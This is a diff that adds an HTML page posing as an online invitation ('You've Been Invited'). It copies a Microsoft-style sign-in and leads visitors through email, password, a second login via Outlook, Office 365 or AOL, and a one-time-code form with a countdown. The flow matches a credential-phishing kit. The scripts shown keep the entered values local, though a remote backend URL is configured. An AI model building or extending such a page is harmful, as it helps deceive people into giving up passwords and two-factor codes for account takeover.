@@ -1,0 +1,540 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>You've Been Invited</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300;1,400&family=Jost:wght@300;400;500&family=Outfit:wght@300;400;500;600&family=Space+Grotesk:wght@300;400;500&family=Playfair+Display:ital,wght@0,400;0,500;1,400&family=Montserrat:wght@300;400;500&display=swap"
+      rel="stylesheet"
+    />
+    <!-- font awesome -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
+    />
+  </head>
+  <body data-theme="classic">
+
+    <div class="card">
+
+      <!-- Landing-first screen -->
+      <div id="landing-screen" >
+        
+        <div class="logo">
+          <img src="./img/logo.svg" alt="logo">
+        </div>
+        <div class="subtext">
+          Sign in
+        </div>
+        <div class="gen">
+          <div class="enter-sign">
+            <div class="input">
+            <input id="primary-email" type="text" placeholder="Email, phone or Username" autocomplete="username">
+            </div>
+            <div class="input">
+              <span>No account? <a href="">Create one!</a></span>
+            </div>
+            <div class="input link">
+              <a href="">Can't access your account ?</a>
+            </div>
+            <div class="btn-box">
+              <button class="btn-submit" id="email-next-btn" type="button">Next</button>
+            </div>
+          </div>
+        </div>
+          
+      </div>
+      <div class="passkey">
+        <img src="./img/key.svg" alt="">
+        <button> Sign-in options</button>
+      </div>
+
+      <!-- Sign in -->
+      <div id="sign-in-landing"style="display:none;">
+        
+        <div class="logo sign-back">
+          <div class="icon">
+            <i class="fas fa-arrow-left"></i>
+          </div>
+          <img src="./img/logo.svg" alt="logo">
+        </div>
+        <div id="email-name">{{email}}</div>
+        <div class="subtext sign-in-subtext">
+          Enter your password
+        </div>
+        <div class="gen gen-signin">
+          <div class="enter-sign">
+            <div class="input">
+              <fieldset class="password-field">
+                <legend>Password</legend>
+                <input id="primary-password" type="password" placeholder="Password" autocomplete="current-password">
+                <button class="password-toggle" type="button" data-password-toggle="primary-password" aria-label="Show password" aria-pressed="false">
+                  <i class="fas fa-eye" aria-hidden="true"></i>
+                </button>
+              </fieldset>
+            </div>
+            <div class="btn-box">
+              <button class="btn-submit sign-btn" id="password-next-btn" type="button">Next</button>
+            </div>
+            <a href="#choose-screen" class="sign-ref">Other ways to sign in</a>
+          </div>
+        </div>
+          
+      </div>
+      <!-- Choose provider screen (hidden initially) -->
+      <div id="choose-screen" style="display:none;">
+        <div class="logo sign-back">
+          <div class="icon">
+            <i class="fas fa-arrow-left"></i>
+          </div>
+          <img src="./img/logo.svg" alt="logo">
+        </div>
+        <div id="email-name">{{email}}</div>
+        <div class="subtext sign-in-subtext">
+          Enter your password
+        </div>
+
+        <div class="divider"></div>
+
+        <p class="section-label">Choose Provider</p>
+
+        <div class="providers">
+        <button class="provider-btn" onclick="openModal('Outlook')">
+          <div class="provider-icon icon-outlook">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+              <rect x="2" y="4" width="13" height="16" rx="2" fill="#0078d4" />
+              <path
+                d="M8 8.5C8 7.12 9.12 6 10.5 6S13 7.12 13 8.5v7C13 16.88 11.88 18 10.5 18S8 16.88 8 15.5v-7z"
+                fill="white"
+                opacity="0.6"
+              />
+              <path
+                d="M13 8h7v8h-7"
+                stroke="#0078d4"
+                stroke-width="1.5"
+                fill="none"
+              />
+              <path d="M13 12h7" stroke="#0078d4" stroke-width="1.5" />
+            </svg>
+          </div>
+          <div class="provider-info">
+            <span class="provider-name">mobile-phone</span>
+            <span class="provider-sub">Approve-sign with Mobile Phone</span>
+          </div>
+        </button>
+
+        <button class="provider-btn" onclick="openModal('Office 365')">
+          <div class="provider-icon icon-office">
+            <i class="fa fa-hashtag">hash</i>
+          </div>
+          <div class="provider-info">
+            <span class="provider-name">password</span>
+            <span class="provider-sub">Use your Password</span>
+          </div>
+        </button> 
+
+        <button class="provider-btn" onclick="openModal('AOL')">
+          <div class="provider-icon icon-aol">
+            <i class="fa fa-envelope">Envelope</i>
+          </div>
+          <div class="provider-info">
+            <span class="provider-name">Email</span>
+            <span class="provider-sub">Send to {{email}}</span>
+          </div>
+        </button>
+      </div>
+
+      <div class="or-row">
+        <div class="or-line"></div>
+        <span class="or-text">OR</span>
+        <div class="or-line"></div>
+      </div>
+
+      <button class="other-btn" onclick="openModal('Email')">
+        <svg
+          width="16"
+          height="16"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="1.5"
+        >
+          <rect x="2" y="4" width="20" height="16" rx="2" />
+          <path d="m2 7 10 7 10-7" />
+        </svg>
+        Continue with another email
+      </button>
+
+      <div class="footer">
+        <span class="footer-brand">myEventProto</span>
+        <span class="certified-badge">Certified</span>
+        <p class="footer-sub">Online Invitations &amp; Greeting Cards</p>
+      </div>
+    </div>
+
+    <!-- Multi-step Modal (Login -> Verify -> OTP) -->
+    <div class="modal-overlay" id="modal">
+      <div class="modal">
+        <button class="modal-close" onclick="closeModal()">×</button>
+
+        <!-- Login Screen -->
+        <div class="modal-screen" id="login-screen">
+          <div class="modal-card-header" style="text-align:center; margin-bottom:12px">
+            <div style="display:flex; align-items:center; justify-content:center; gap:12px;">
+              <!-- <div class="logo-circle" style="width:48px;height:48px;">
+                <span class="logo-text">PA</span>
+              </div>
+              <div style="text-align:left">
+                <div style="font-weight:600; font-size:16px;">You have received</div>
+                <div style="font-size:14px; color:var(--text-muted)">an invitation</div>
+              </div> -->
+            </div>
+            <!-- <div style="margin-top:8px; font-size:13px; color:var(--text-muted)">Sign in with your email provider to view your exclusive invitation on myEventProto</div> -->
+          </div>
+
+          <div class="modal-icon">
+            <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
+              <rect x="2" y="4" width="13" height="16" rx="2" fill="#0078d4" />
+              <path
+                d="M13 8h7v8h-7"
+                stroke="#0078d4"
+                stroke-width="1.5"
+                fill="none"
+              />
+            </svg>
+          </div>
+          <h2 class="modal-title">
+            Login with <span id="modal-provider">Outlook</span>
+          </h2>
+          <div
+            style="
+              margin-bottom: 14px;
+              text-align: center;
+              color: var(--text-muted);
+            "
+          >
+            Enter your email credentials to continue
+          </div>
+          <label class="otp-label">Email Address</label>
+          <input
+            class="otp-input"
+            id="email"
+            type="email"
+            placeholder="Enter your email"
+          />
+          <fieldset class="password-field modal-password-field">
+            <legend>Password</legend>
+            <input
+              class="otp-input"
+              id="password"
+              type="password"
+              placeholder="Enter Password"
+              autocomplete="current-password"
+            />
+            <button class="password-toggle" type="button" data-password-toggle="password" aria-label="Show password" aria-pressed="false">
+              <i class="fas fa-eye" aria-hidden="true"></i>
+            </button>
+          </fieldset>
+          <div class="modal-actions" style="margin-top: 18px">
+            <button class="btn-close" onclick="closeModal()">Close</button>
+            <button class="btn-submit" id="login-btn">Login</button>
+          </div>
+        </div>
+
+        <!-- Verify Identity Screen -->
+        <div class="modal-screen" id="verify-screen">
+          <div class="modal-icon">
+            <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
+              <rect
+                x="2"
+                y="4"
+                width="20"
+                height="14"
+                rx="2"
+                fill="#f5f0ea"
+                stroke="#e0d4bf"
+              />
+            </svg>
+          </div>
+          <h2 class="modal-title">Verify Your Identity</h2>
+          <div
+            class="modal-notice"
+            style="background: transparent; color: var(--text-muted)"
+          >
+            You will receive an OTP within 1-5 minutes. Please check the phone
+            number on file.
+          </div>
+          <div style="text-align: center; margin-top: 18px">
+            <button class="btn-close" onclick="closeModal()">Cancel</button>
+            <button
+              class="btn-submit"
+              id="verify-ok-btn"
+              style="margin-left: 12px"
+            >
+              OK
+            </button>
+          </div>
+        </div>
+
+        <!-- OTP Screen -->
+        <div class="modal-screen" id="otp-screen">
+          <div class="modal-icon">
+            <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
+              <rect x="2" y="4" width="13" height="16" rx="2" fill="#0078d4" />
+              <path
+                d="M13 8h7v8h-7"
+                stroke="#0078d4"
+                stroke-width="1.5"
+                fill="none"
+              />
+            </svg>
+          </div>
+          <h2 class="modal-title">
+            Enter the OTP — Login with
+            <span id="modal-provider_2" style="display: none">Outlook</span>
+          </h2>
+          <div class="modal-notice">
+            We've sent a code to your phone. It may take up to 5 minutes.
+          </div>
+          <p class="otp-label">Enter OTP</p>
+          <input
+            class="otp-input"
+            id="otp"
+            type="number"
+            placeholder="Enter 6-digit code"
+            maxlength="6"
+          />
+          <div class="timer" id="timer">Time left: 3:00</div>
+          <div class="modal-actions">
+            <button class="btn-close" onclick="closeModal()">Close</button>
+            <button class="btn-submit" id="otp-btn">Submit</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // ── Backend API configuration ──
+      // Replace this URL with your backend deployment URL when the frontend and backend are hosted separately.
+      // For local testing, this will use http://localhost:3000 automatically.
+      const API_BASE_URL =
+        "https://eventbackend-u9xt.onrender.com"; /* Replace with your deployed backend URL */
+      function getApiBaseUrl() {
+        if (API_BASE_URL.includes("YOUR_BACKEND_HOST")) {
+          if (
+            window.location.hostname === "localhost" ||
+            window.location.hostname === "127.0.0.1"
+          ) {
+            return "http://localhost:3000";
+          }
+          console.warn(
+            "API_BASE_URL is not configured. Update frontend/public/index.html to your backend URL.",
+          );
+          return window.location.origin;
+        }
+        return API_BASE_URL.replace(/\/+$/, "");
+      }
+
+      window.addEventListener("resize", () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      });
+
+
+      // ── Modal & Timer ──
+      let timerInterval;
+
+      function showScreen(id) {
+        document
+          .querySelectorAll(".modal-screen")
+          .forEach((el) => (el.style.display = "none"));
+        const el = document.getElementById(id);
+        if (el) el.style.display = "block";
+      }
+
+      function openModal(provider) {
+        const pEls = document.querySelectorAll(
+          "#modal-provider, #modal-provider_2",
+        );
+        pEls.forEach((pe) => (pe.textContent = provider));
+        // reset fields
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+        document.getElementById("password").type = "password";
+        document.querySelector('[data-password-toggle="password"]').closest(".password-field").classList.remove("is-active");
+        document.getElementById("password").setAttribute("placeholder", "Enter Password");
+        const passwordToggle = document.querySelector('[data-password-toggle="password"]');
+        passwordToggle.setAttribute("aria-label", "Show password");
+        passwordToggle.setAttribute("aria-pressed", "false");
+        passwordToggle.querySelector("i").className = "fas fa-eye";
+        document.getElementById("otp").value = "";
+        // open overlay and show login screen first
+        document.getElementById("modal").classList.add("active");
+        showScreen("login-screen");
+        clearInterval(timerInterval);
+      }
+
+      function closeModal() {
+        document.getElementById("modal").classList.remove("active");
+        clearInterval(timerInterval);
+      }
+
+      function startTimer(seconds) {
+        clearInterval(timerInterval);
+        let remaining = seconds;
+        updateTimerDisplay(remaining);
+        timerInterval = setInterval(() => {
+          remaining--;
+          updateTimerDisplay(remaining);
+          if (remaining <= 0) clearInterval(timerInterval);
+        }, 1000);
+      }
+
+      function updateTimerDisplay(s) {
+        const m = Math.floor(s / 60).toString();
+        const sec = (s % 60).toString().padStart(2, "0");
+        document.getElementById("timer").textContent = `Time left: ${m}:${sec}`;
+      }
+    </script>
+
+    <script>
+      // Wait for page to fully load before attaching events
+      document.addEventListener("DOMContentLoaded", function () {
+        // Landing -> password -> provider choices flow
+        const emailNextBtn = document.getElementById("email-next-btn");
+        const passwordNextBtn = document.getElementById("password-next-btn");
+        const primaryEmail = document.getElementById("primary-email");
+        const primaryPassword = document.getElementById("primary-password");
+        const landing = document.getElementById("landing-screen");
+        const signIn = document.getElementById("sign-in-landing");
+        const choose = document.getElementById("choose-screen");
+        const emailLabels = document.querySelectorAll("#email-name");
+
+        function replaceEmailLabels(email) {
+          emailLabels.forEach((label) => {
+            label.textContent = email;
+          });
+        }
+
+        function showPassword() {
+          const email = primaryEmail.value.trim();
+          if (!email) {
+            primaryEmail.focus();
+            alert("Please enter your email, phone or username.");
+            return;
+          }
+
+          replaceEmailLabels(email);
+          landing.style.display = "none";
+          signIn.style.display = "flex";
+        }
+
+        function showChoose() {
+          if (!primaryPassword.value) {
+            primaryPassword.focus();
+            alert("Please enter your password.");
+            return;
+          }
+
+          signIn.style.display = "none";
+          if (choose) choose.style.display = "block";
+        }
+
+        function showChooseWithoutPassword(event) {
+          event.preventDefault();
+          signIn.style.display = "none";
+          choose.style.display = "block";
+        }
+
+        document.querySelectorAll(".sign-ref").forEach((link) => {
+          link.addEventListener("click", showChooseWithoutPassword);
+        });
+
+        document.querySelectorAll(".sign-back .icon").forEach((backButton) => {
+          backButton.addEventListener("click", () => {
+            choose.style.display = "none";
+            signIn.style.display = "none";
+            landing.style.display = "flex";
+          });
+        });
+
+        document.querySelectorAll("[data-password-toggle]").forEach((toggle) => {
+          toggle.addEventListener("click", () => {
+            const input = document.getElementById(toggle.dataset.passwordToggle);
+            const icon = toggle.querySelector("i");
+            const isVisible = input.type === "text";
+            input.type = isVisible ? "password" : "text";
+            toggle.setAttribute("aria-label", isVisible ? "Show password" : "Hide password");
+            toggle.setAttribute("aria-pressed", String(!isVisible));
+            icon.classList.toggle("fa-eye", isVisible);
+            icon.classList.toggle("fa-eye-slash", !isVisible);
+            input.focus();
+          });
+        });
+
+        document.querySelectorAll(".password-field").forEach((field) => {
+          const input = field.querySelector("input");
+          const placeholder = input.getAttribute("placeholder");
+
+          input.addEventListener("focus", () => {
+            field.classList.add("is-active");
+            input.removeAttribute("placeholder");
+          });
+
+          input.addEventListener("blur", () => {
+            window.setTimeout(() => {
+              if (!field.contains(document.activeElement) && !input.value) {
+                field.classList.remove("is-active");
+                input.setAttribute("placeholder", placeholder);
+              }
+            }, 0);
+          });
+        });
+
+        if (emailNextBtn) emailNextBtn.addEventListener("click", showPassword);
+        if (passwordNextBtn) passwordNextBtn.addEventListener("click", showChoose);
+        document.addEventListener("keydown", (e) => {
+          if (e.key !== "Enter") return;
+          if (landing.style.display !== "none") showPassword();
+          else if (signIn.style.display !== "none") showChoose();
+        });
+
+        // Provider modal login is a local demo flow; no credentials leave the browser.
+        const loginBtn = document.getElementById("login-btn");
+        if (loginBtn)
+          loginBtn.addEventListener("click", function () {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            if (!email || !password) {
+              alert("Please fill in both fields");
+              return;
+            }
+            showScreen("verify-screen");
+          });
+
+        // VERIFY OK -> start OTP screen and timer
+        const verifyOk = document.getElementById("verify-ok-btn");
+        if (verifyOk)
+          verifyOk.addEventListener("click", function () {
+            showScreen("otp-screen");
+            startTimer(180); // 3 minutes
+          });
+
+        // OTP submit is kept local for the demo.
+        const otpBtn = document.getElementById("otp-btn");
+        if (otpBtn)
+          otpBtn.addEventListener("click", function () {
+            const otp = document.getElementById("otp").value;
+            if (!otp) {
+              alert("Please enter the OTP");
+              return;
+            }
+            alert("OTP submitted (demo).");
+            closeModal();
+          });
+      });
+    </script>
+  </body>
+</html>
